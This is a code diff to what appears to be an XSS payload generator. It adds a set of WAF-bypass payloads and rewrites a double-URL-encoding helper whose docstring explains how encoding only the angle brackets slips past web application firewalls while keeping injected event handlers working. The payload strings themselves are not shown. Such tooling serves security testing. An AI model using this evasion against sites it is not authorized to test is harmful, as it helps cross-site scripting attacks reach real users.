@@ -23,11 +23,6 @@ from typing import List, Optional
 from ..reporter import ReflectionContext
 
 
-def _fmt(template: str, marker: str) -> str:
-  """Substitute ``{marker}`` in *template* without invoking Python's full
-  format mini-language.  This avoids ``IndexError`` / ``KeyError`` when a
-  payload itself contains bare ``{}`` or ``{0.__class__}`` etc."""
-  return template.replace("{marker}", marker)
 from ..http.waf_detect import (
   EVASION_BACKTICK,
   EVASION_CASE_MIXING,
@@ -81,6 +76,7 @@ from ._payloads.advanced import (
   RESTRICTED_CHARS,
   POLYGLOT,
   WAF_BYPASS_GLOBAL,
+  WAF_BYPASS_DOUBLE_ENCODE,
   PROTOTYPE_POLLUTION,
   CLASSIC_LEGACY,
   ENCODING,
@@ -96,6 +92,13 @@ from ._payloads.advanced import (
   SANITIZER_BYPASS,
   CSP_INJECTION,
 )
+
+def _fmt(template: str, marker: str) -> str:
+  """Substitute ``{marker}`` in *template* without invoking Python's full
+  format mini-language.  This avoids ``IndexError`` / ``KeyError`` when a
+  payload itself contains bare ``{}`` or ``{0.__class__}`` etc."""
+  return template.replace("{marker}", marker)
+
 
 # ---------------------------------------------------------------------------
 # Confirmation marker — unique string embedded in every payload.
@@ -191,6 +194,12 @@ def generate(
     for p in payloads:
       transformed.extend(_apply_evasion(p, evasion))
     payloads = transformed
+
+  # For double-encode evasion, prepend targeted payloads that avoid
+  # onerror/onload/script — common keyword blocks in raw-string WAFs (w1d style).
+  if evasion == EVASION_DOUBLE_ENCODE:
+    de_targeted = [_double_url_encode(_fmt(p, marker)) for p in WAF_BYPASS_DOUBLE_ENCODE]
+    payloads = de_targeted + payloads
 
   if custom_payloads:
     payloads.extend(custom_payloads)
@@ -453,9 +462,19 @@ def _unicode_escape_alpha(s: str) -> str:
 
 
 def _double_url_encode(s: str) -> str:
-  """URL-encode special chars twice."""
-  once = urllib.parse.quote(s, safe="")
-  return urllib.parse.quote(once, safe="")
+  """Double URL-encode only angle brackets.
+
+  WAFs that inspect the raw query string before server-side URL decoding are
+  fooled because %253c/%253e (double-encoded) don't match the literal ``<``/``>``
+  pattern the WAF checks for.  The server then decodes %25 -> % to yield %3c/%3e,
+  and the browser/template decodes those to the actual angle brackets.
+
+  Encoding the *entire* payload would also double-encode event-handler names and
+  attribute values, so the server would render them as literal text rather than as
+  HTML attributes — defeating the XSS.  Encoding only < and > is sufficient to
+  slip past the WAF while keeping the rest of the payload functional.
+  """
+  return s.replace("<", "%253c").replace(">", "%253e")
 
 
 def _chunked_tag(s: str) -> str:
